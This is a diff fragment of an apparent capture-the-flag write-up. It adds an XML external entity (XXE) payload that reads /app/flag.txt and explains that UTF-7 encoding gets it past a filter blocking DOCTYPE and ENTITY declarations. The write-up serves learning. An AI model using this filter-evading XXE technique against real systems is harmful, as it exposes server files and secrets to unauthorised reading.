@@ -12,6 +12,12 @@ Welp, the code kinda blocks a certain thing which is the <!DOCTYPE AND <!ENTITY 
 ![image](https://github.com/user-attachments/assets/213ac47f-6638-4533-98cb-8cae1d6a6740)
 
 However, for whatever reason as seen here, the way cyberchef encodes the payload in UTF7 doesnt seem to clash with the present filter of the code
+```
+<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE replace [ <!ENTITY fauna SYSTEM "file:/app/flag.txt"> ]>
+<data><weight>&fauna;</weight><height>20</height></data>
+```
+All we have to do is encode the second part 
+
 ![image](https://github.com/user-attachments/assets/280bbdec-364c-43b7-be84-0bcca5f8a156)
 
 AND there you have it 
